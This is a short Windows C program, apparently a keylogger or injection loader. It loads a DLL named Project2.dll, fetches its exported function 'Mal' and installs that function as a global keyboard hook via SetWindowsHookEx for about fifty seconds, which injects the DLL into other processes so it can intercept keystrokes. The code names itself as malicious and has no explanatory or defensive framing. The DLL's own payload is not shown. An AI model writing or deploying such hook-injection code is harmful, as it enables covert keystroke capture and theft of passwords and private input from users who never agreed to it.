#include <windows.h>
#include <winuser.h>
typedef int (*Mal)();

int main(void)
{
    HINSTANCE malDll;
    Mal malFunc;

    malDll = LoadLibrary("Project2.dll");

    malFunc = (Mal)GetProcAddress(malDll, "Mal");

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)malFunc, malDll, 0);
    Sleep(5 * 10000);
    UnhookWindowsHookEx(hook);

    return 0;
}
